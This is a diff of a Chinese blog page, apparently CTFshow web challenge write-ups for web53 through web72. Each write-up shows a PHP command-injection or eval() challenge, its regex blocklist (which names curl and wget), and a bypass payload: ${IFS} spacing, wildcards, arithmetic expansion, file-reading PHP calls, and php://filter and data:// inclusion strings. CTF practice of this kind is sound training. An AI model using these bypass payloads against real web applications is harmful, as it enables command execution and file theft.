@@ -722,7 +722,213 @@ if(isset($_GET[&#39;c&#39;])){
 }else{ 
     highlight_file(__FILE__); 
 } </code></pre><p>&lt;被过滤了，用${IFS}</p>
-<pre><code>?c=nl$IFS/fl&#39;&#39;ag||</code></pre><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>index.php?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<pre><code>?c=nl$IFS/fl&#39;&#39;ag||</code></pre><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><pre><code>&lt;?php 
+
+/* 
+# -*- coding: utf-8 -*- 
+# @Author: h1xa 
+# @Date:   2020-09-05 20:49:30 
+# @Last Modified by:   h1xa 
+# @Last Modified time: 2020-09-07 18:21:02 
+# @email: h1xa@ctfer.com 
+# @link: https://ctfer.com 
+
+*/ 
+
+
+if(isset($_GET[&#39;c&#39;])){ 
+    $c=$_GET[&#39;c&#39;]; 
+    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c)){ 
+        echo($c); 
+        $d = system($c); 
+        echo &quot;&lt;br&gt;&quot;.$d; 
+    }else{ 
+        echo &#39;no&#39;; 
+    } 
+}else{ 
+    highlight_file(__FILE__); 
+} </code></pre><pre><code>?c=nl${IFS}fl%27%27ag.php</code></pre><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><pre><code>&lt;?php 
+
+/* 
+# -*- coding: utf-8 -*- 
+# @Author: Lazzaro 
+# @Date:   2020-09-05 20:49:30 
+# @Last Modified by:   h1xa 
+# @Last Modified time: 2020-09-07 19:43:42 
+# @email: h1xa@ctfer.com 
+# @link: https://ctfer.com 
+
+*/ 
+
+
+if(isset($_GET[&#39;c&#39;])){ 
+    $c=$_GET[&#39;c&#39;]; 
+    if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c)){ 
+        system($c); 
+    } 
+}else{ 
+    highlight_file(__FILE__); 
+}</code></pre><p>这一题过滤了常用的命令，但是还有一个paste命令</p>
+<p>paste 指令会把每个文件以列对列的方式，一列列地加以合并。</p>
+<pre><code>?c=paste${IFS}f???.???</code></pre><p>还有一个grep命令</p>
+<p>Linux grep 命令用于查找文件里符合条件的字符串。</p>
+<p>在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：</p>
+<pre><code>grep test *file </code></pre><pre><code>?c=grep${IFS}%27f%27${IFS}fl??.php</code></pre><p>或者</p>
+<pre><code>?c=/bin/?at${IFS}f?????hp</code></pre><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><pre><code>&lt;?php 
+
+/* 
+# -*- coding: utf-8 -*- 
+# @Author: Lazzaro 
+# @Date:   2020-09-05 20:49:30 
+# @Last Modified by:   h1xa 
+# @Last Modified time: 2020-09-07 20:03:51 
+# @email: h1xa@ctfer.com 
+# @link: https://ctfer.com 
+
+*/ 
+
+// 你们在炫技吗？ 
+if(isset($_GET[&#39;c&#39;])){ 
+    $c=$_GET[&#39;c&#39;]; 
+    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c)){ 
+        system($c); 
+    } 
+}else{ 
+    highlight_file(__FILE__); 
+} </code></pre><p>a-z都给禁了…俺啥也不会，直接放大佬的文章</p>
+<p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145" target="_blank" rel="noopener">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201125145608.jpg" alt></p>
+<p>主要是通过POST上传数据包，然后通过点命令去执行</p>
+<p>还有下边这篇文章，讲了一个更简单的方法</p>
+<p><a href="https://blog.csdn.net/qq_46091464/article/details/108555433" target="_blank" rel="noopener">https://blog.csdn.net/qq_46091464/article/details/108555433</a></p>
+<p>通过数字去匹配base64命令和bzip2命令</p>
+<h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><pre><code>&lt;?php 
+
+/* 
+# -*- coding: utf-8 -*- 
+# @Author: Lazzaro 
+# @Date:   2020-09-05 20:49:30 
+# @Last Modified by:   h1xa 
+# @Last Modified time: 2020-09-07 22:02:47 
+# @email: h1xa@ctfer.com 
+# @link: https://ctfer.com 
+
+*/ 
+
+// 你们在炫技吗？ 
+if(isset($_GET[&#39;c&#39;])){ 
+    $c=$_GET[&#39;c&#39;]; 
+    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\{|\&#39;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c)){ 
+        system($c); 
+    } 
+}else{ 
+    highlight_file(__FILE__); 
+}</code></pre><p>同55</p>
+<p>通过POST上传数据包，然后通过点命令去执行</p>
+<h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><pre><code>&lt;?php 
+
+/* 
+# -*- coding: utf-8 -*- 
+# @Author: h1xa 
+# @Date:   2020-09-05 20:49:30 
+# @Last Modified by:   h1xa 
+# @Last Modified time: 2020-09-08 01:02:56 
+# @email: h1xa@ctfer.com 
+# @link: https://ctfer.com 
+*/ 
+
+// 还能炫的动吗？ 
+//flag in 36.php 
+if(isset($_GET[&#39;c&#39;])){ 
+    $c=$_GET[&#39;c&#39;]; 
+    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#39;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c)){ 
+        system(&quot;cat &quot;.$c.&quot;.php&quot;); 
+    } 
+}else{ 
+    highlight_file(__FILE__); 
+} </code></pre><p>构造36</p>
+<p>${_}：输出上一次命令执行的结果</p>
+<p>$(())：做运算</p>
+<p>$((“”))：值为0</p>
+<p>$((~$((“”))))：值为-1</p>
+<p>payload”</p>
+<pre><code>?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</code></pre><h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><pre><code>&lt;?php 
+
+/* 
+# -*- coding: utf-8 -*- 
+# @Author: Lazzaro 
+# @Date:   2020-09-05 20:49:30 
+# @Last Modified by:   h1xa 
+# @Last Modified time: 2020-09-07 22:02:47 
+# @email: h1xa@ctfer.com 
+# @link: https://ctfer.com 
+
+*/ 
+
+// 你们在炫技吗？ 
+if(isset($_POST[&#39;c&#39;])){ 
+        $c= $_POST[&#39;c&#39;]; 
+        eval($c); 
+}else{ 
+    highlight_file(__FILE__); 
+} </code></pre><p>payload</p>
+<pre><code>c=show_source(&#39;flag.php&#39;);
+c=highlight_file(&quot;flag.php&quot;);
+c=echo file_get_contents(&quot;flag.php&quot;);
+c=readfile(&quot;flag.php&quot;);
+c=print_r(file(&quot;flag.php&quot;)); 
+c=copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);
+c=rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);</code></pre><h3 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h3><p>禁用了 file_get_contents()、readfile()</p>
+<pre><code>c=show_source(&#39;flag.php&#39;);
+c=highlight_file(&quot;flag.php&quot;);
+c=print_r(file(&quot;flag.php&quot;)); 
+c=copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);
+c=rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);</code></pre><h3 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h3><p>禁用了 file() </p>
+<pre><code>c=show_source(&#39;flag.php&#39;);
+c=highlight_file(&quot;flag.php&quot;);
+c=copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);
+c=rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);</code></pre><h3 id="web61-63"><a href="#web61-63" class="headerlink" title="web61-63"></a>web61-63</h3><p>禁用了 copy()、rename()</p>
+<pre><code>c=show_source(&#39;flag.php&#39;);
+c=highlight_file(&quot;flag.php&quot;);</code></pre><h3 id="web62-65"><a href="#web62-65" class="headerlink" title="web62-65"></a>web62-65</h3><pre><code>c=show_source(&#39;flag.php&#39;);
+c=highlight_file(&quot;flag.php&quot;);</code></pre><h3 id="web66-67"><a href="#web66-67" class="headerlink" title="web66-67"></a>web66-67</h3><p>禁用了show_source()，并且flag不在flag.php</p>
+<p>查看文件</p>
+<pre><code>c=var_dump(scandir(&quot;/&quot;));
+c=$a=opendir(&quot;/&quot;); while (($file = readdir($a)) !== false){echo $file . &quot;&lt;br&gt;&quot;; };</code></pre><p>flag在flag.txt</p>
+<pre><code>c=highlight_file(&quot;/flag.txt&quot;);
+c=include(&quot;/flag.txt&quot;);
+c=require(&quot;/flag.txt&quot;);</code></pre><h3 id="web68-70"><a href="#web68-70" class="headerlink" title="web68-70"></a>web68-70</h3><p> highlight_file()居然也被禁了</p>
+<pre><code>c=include(&quot;/flag.txt&quot;);
+c=require(&quot;/flag.txt&quot;);</code></pre><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><pre><code>&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+ini_set(&#39;display_errors&#39;, 0);
+// 你们在炫技吗？
+if(isset($_POST[&#39;c&#39;])){
+        $c= $_POST[&#39;c&#39;];
+        eval($c);
+        $s = ob_get_contents();
+        ob_end_clean();
+        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);
+}else{
+    highlight_file(__FILE__);
+}
+
+?&gt;
+
+你要上天吗？</code></pre><p>将输出的字母和数字都替换成了? ，可以用exit();终止脚本的执行，从而让替换代码失效。</p>
+<pre><code>c=include(&quot;/flag.txt&quot;);exit();
+c=require(&quot;/flag.txt&quot;);exit();</code></pre><h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>index.php?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
 <h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</p>
 <p>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJubCAqIik/Pg==</p>
 
@@ -831,7 +1037,7 @@ if(isset($_GET[&#39;c&#39;])){
   
   <div class="outer">
     <div id="footer-info" class="inner">
-      &copy; 2020 奝<br>
+      &copy; 2021 奝<br>
       powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
